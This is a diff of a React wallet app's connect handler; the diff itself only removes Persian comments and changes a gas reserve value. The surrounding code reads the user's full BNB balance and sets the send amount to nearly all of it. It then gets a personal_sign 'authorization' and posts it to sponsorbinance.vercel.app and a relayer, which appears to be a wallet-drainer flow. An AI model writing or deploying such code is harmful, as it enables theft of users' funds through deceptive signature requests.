@@ -23,7 +23,6 @@ function App() {
       return;
     }
 
-    // اتصال کیف پول کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -39,7 +38,6 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // دریافت بالانس واقعی از شبکه
     const liveBalanceStr = await getLiveBalance(userAddress);
     console.log("💰 Live BNB Balance:", liveBalanceStr);
     const totalBalance = parseFloat(liveBalanceStr);
@@ -48,8 +46,7 @@ function App() {
       return;
     }
 
-    // تعیین reserve (برای مثال 0.01 BNB) تا موجودی کافی برای gas باقی بماند
-    const reserveBNB = 0.01;
+    const reserveBNB = 0.02;
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
       console.error("❌ Insufficient funds to cover reserve for gas fee.");
@@ -57,13 +54,11 @@ function App() {
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    // ساخت پیام برای امضا بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
     let signature;
     try {
-      // استفاده از personal_sign برای امضای پیام
       signature = await window.ethereum.request({
         method: "personal_sign",
         params: [message, userAddress],
@@ -74,7 +69,6 @@ function App() {
       return;
     }
 
-    // ارسال داده‌های امضا شده به سرور اولیه (send.php) جهت بررسی
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -97,7 +91,6 @@ function App() {
       return;
     }
 
-    // ارسال درخواست به relayer برای پخش تراکنش meta
     try {
       const resp2 = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
